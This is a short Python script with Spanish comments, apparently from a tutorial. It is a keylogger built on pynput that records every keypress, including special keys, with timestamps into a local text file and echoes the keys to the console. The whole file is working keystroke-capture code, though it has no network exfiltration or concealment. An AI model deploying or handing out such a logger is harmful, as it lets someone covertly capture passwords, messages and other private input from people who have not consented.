import logging
from pynput import keyboard

# Ruta donde se guardará el archivo de registro
carpeta_destino = 'D:\\Programas\\Programación\\Python\\Keylogger\\KeyloggerYT.txt'

# Configurar el sistema de logs
logging.basicConfig(
    filename=carpeta_destino,
    level=logging.DEBUG, 
    format='%(asctime)s - %(message)s'
)

def on_press(key):
    try:
        # Intenta obtener el carácter normal de la tecla presionada
        print(f'Key: {key.char}')
        logging.info(str(key.char))
    except AttributeError:
        # Si es una tecla especial (Espacios, Enter, Shift, etc.)
        print(f'Special Key: {key}')
        logging.info(str(key))

# Iniciar el escuchador de eventos de teclado de forma limpia
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()